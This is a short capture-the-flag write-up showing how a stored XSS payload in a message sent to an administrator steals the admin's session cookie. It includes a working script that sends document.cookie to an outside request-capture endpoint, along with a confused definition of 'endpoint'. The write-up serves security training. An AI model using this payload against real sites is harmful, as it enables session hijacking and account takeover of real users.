# XSS Stored 1 - Writeup

> Steal the administrator session cookie and use it to validate this chall.

**Steps**
- [x] Start the challenge
- [x] See that there is a form to send messages to the admin
- [x] Searching a way to stole the cookie

**How to stole the cookie ?**

In order to stole the admin's cookie, you should interest youself in endpoints.
An endpoint is any device that is physically an end point on a network such as laptops, desktops, mobile phones, tablets, servers, and virtual environments.

Consider using [**beeceptor**](https://beeceptor.com/) as an endpoint creator.

In this example we have made an endpoint named : **https://zidane.free.beeceptor.com**

Using the code below you will be able to stole the admin cookie by creating in the message that you send to the admin an image.
```

<script>document.write('<img src="https://zidane.free.beeceptor.com/bonjour?cookie=' + document.cookie + '" />')</script>

```

This image will refer to your endpoint, adding the cookie in parameter of the https request thanks to ``` /bonjour?cookie=' + document.cookie ```

Few minutes later, you will receive the cookie on [**beeceptor**](https://beeceptor.com/) because the "admin" would have open the message.

